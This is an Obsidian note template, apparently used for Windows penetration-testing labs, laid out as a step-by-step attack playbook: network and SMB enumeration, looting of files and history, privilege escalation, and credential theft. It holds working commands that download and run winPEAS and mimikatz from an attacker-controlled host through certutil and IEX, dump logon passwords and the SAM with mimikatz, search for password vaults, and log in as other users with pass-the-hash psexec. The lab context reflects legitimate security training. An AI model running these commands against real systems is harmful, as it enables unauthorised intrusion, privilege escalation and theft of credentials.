#show #windows
<%*
const path = tp.file.folder(true).split('/');
const filename = "0_" + path[path.length - 1];
await tp.file.rename(filename);
tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
-%>

First flag: ☑️
Second flag: ✅

# Enumeration
```bash
i="";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -T 4 -sUV --top-ports 100 $i -oN 0_udp_top100.txt
```
##### MSRPC (135, 593)
```bash
impacket-rpcdump $hip | grep '12345778-1234-abcd-ef00-0123456789ab\|3919286a-b10c-11d0-9ba8-00c04fd92ef5\|12345778-1234-abcd-ef00-0123456789ac\|1ff70682-0a51-30e8-076d-740be8cee98b\|338cd001-2244-31f1-aaaa-900038001003\|367abb81-9844-35f1-ad32-98f038001003\|4b324fc8-1670-01d3-1278-5a47bf6ee188\|4d9f4ab8-7d1c-11cf-861e-0020af6e7c57'
```

##### SMB (139, 445) #login
```bash
i=$hip; enum4linux -a $i ; enum4linux-ng -A $i ; crackmapexec smb $i 2>/dev/null
```
If used with proxy, use `proxychains -q`. Provide creds with `-u "<username>" -p "<passwd>"` 
Username can be `$(find . -name "9*.md" -print | cut -d "/" -f2 | cut -d "." -f1 | cut -d "_" -f2 | cut -d " " -f 1)`
Alternativ: [grab_smbversion.sh](file:////home/kali/Documents/activeInformationGathering/)
# Initial Foothold

### Software Versions

	 `searchsploit` and Google Dorks

### Insecure configurations
> Use the service template to document possible attack vectors and document here which worked
> NSE scripts: `ls /usr/share/nmap/scripts`
> Run the following for all services: `nmap --script "safe and smb-*" $hip`. If nothing helps, try `nmap --script "smb-vuln-*" $hip`


# Loot

Hostname `hostname`
	

Flag `type C:\Users\Administrator\Desktop\proof.txt` or local.txt for non-elevated
	
##### Users
```powershell
Get-LocalUser
```
Alternative: `net user`
##### Network
```powershell
ipconfig /all; route print; netstat -ano; netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```

##### Interesting files
```powershell
Get-ChildItem -Recurse -Path C:\Users\ -File -Exclude Desktop.lnk,Downloads.lnk,Bing.url | select Name,Directory; Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; type (Get-PSReadlineOption).HistorySavePath
```

##### Advanced
Mounted Volumes: `mountvol`
Devices: `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer`
Drivers: `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"`
Shadow Copy: `vssadmin list shadows`, `mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`
# PrivEsc
##### Find Working Dir for attack, if not \\Users\\Public
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	
##### WinPEAS
```powershell
cd \Users\Public ; certutil.exe -urlcache -split -f "http://192.168.45.189:8181/winPEASx64.exe" ; winPEASx64.exe
```
Alternative (not tested yet):
```bash
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); ./linpeash.ps1 -a -r | tee linpeas.txt
```
Read it with color-highlighting using `less -r linpeas.txt`

> I still have to run WinPEAS once and check what additional commands I need to integrate from [[2_loot-privEsc_Windows_Manually]]

##### Windows Exploit Suggester - Next Generation
On target, execute `systeminfo > systeminfo.txt` and transfer file. On kali, do
```bash
wes --muc-lookup systeminfo.txt
```

Consider [[3_dllHijacking_guide]]

Ways to login as another user:
- `impacket-psexec '$user:$password@$hip'` oder `impacket-psexec -hashes 00000000000000000000000000000000:$ntlm_hash '$user@$hip'`
- If we have access to the GUI -> `RunAs /user:$user cmd`
- User is in group _Remote Desktop Users_ -> RDP
- User is in group _Remote Management Users_ -> WinRM (Better use [evil-winrm](https://github.com/Hackplayers/evil-winrm) from non-interactive shells)
- User has _Log on as a batch job_ right -> Schedule task to execute a program of our choice as this user
- User has active session -> Use PsExec (SysInternals)

# Loot passwords
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.IP:8000/mimikatz.exe" ; .\mimikatz.exe privilege::debug sekurlsa::logonpasswords lsadump::sam exit
```